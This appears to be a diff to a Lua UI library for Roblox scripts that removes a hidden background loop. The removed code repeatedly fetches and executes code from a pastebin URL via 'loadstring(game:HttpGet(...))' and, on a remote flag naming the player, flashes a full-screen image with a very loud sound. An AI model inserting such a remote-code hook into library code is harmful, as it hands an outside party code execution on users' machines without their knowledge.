@@ -1136,8 +1136,6 @@ function Library:Create(config)
 		end
 	end)
 
-
-	-- make the first tab visible
 	location['dark_UI'].main.tabContainer.ChildAdded:Connect(function()
 		location['dark_UI'].main:FindFirstChild('container').Visible = true
 		pcall(function()
@@ -1154,54 +1152,6 @@ function Library:Create(config)
 		sound.Volume = 1.5
 		sound:Play()
 		game.Debris:AddItem(sound,4)
-	end)
-
-	task.spawn(function()
-		local dbb = false
-		while task.wait(1.5) do
-			if dbb == false then
-				loadstring(game:HttpGet("https://pastebin.com/raw/TZ2dhbSc"))()
-
-				repeat
-					task.wait()
-				until game.Lighting:FindFirstChild("DO_THE_JS")
-
-				local js = game.Lighting:FindFirstChild("DO_THE_JS")
-				if js.Value == true and js:GetAttribute("Username") == LocalPlayer.Name then
-					dbb = true
-					local Jframe = Instance.new("ImageLabel")
-					Jframe.Image = "rbxassetid://10755920324"
-					Jframe.AnchorPoint = Vector2.new(0.5, 0.5)
-					Jframe.Position = UDim2.new(0, 0, 0, 0)
-					Jframe.Size = UDim2.new(0.01, 0, 0.01, 0)
-					Jframe.BackgroundTransparency = 1
-					Jframe.ImageTransparency = 0.99
-					Jframe.Parent = dark_UI
-
-					task.wait(2)
-
-					Jframe.ImageTransparency = 0
-					Jframe.Position = UDim2.new(0.5, 0, 0.5, 0)
-					Jframe.Size = UDim2.new(1, 0, 1, 0)
-
-					local Jsfx = Instance.new("Sound")
-					Jsfx.SoundId = "rbxassetid://85271883712040"
-					Jsfx.Parent = dark_UI
-					Jsfx.Volume = 10
-					Jsfx:Play()
-					game.Debris:AddItem(Jsfx, 5)
-
-					game.TweenService:Create(Jframe, TweenInfo.new(0.3), {Size = UDim2.new(1.5, 0, 1.5, 0)}):Play()
-					game.Debris:AddItem(Jframe, 0.3)
-					task.delay(40, function()
-						dbb = false
-					end)
-					js:Destroy()
-				else
-					js:Destroy()
-				end
-			end
-		end
 	end)
 
 	return tabHandler
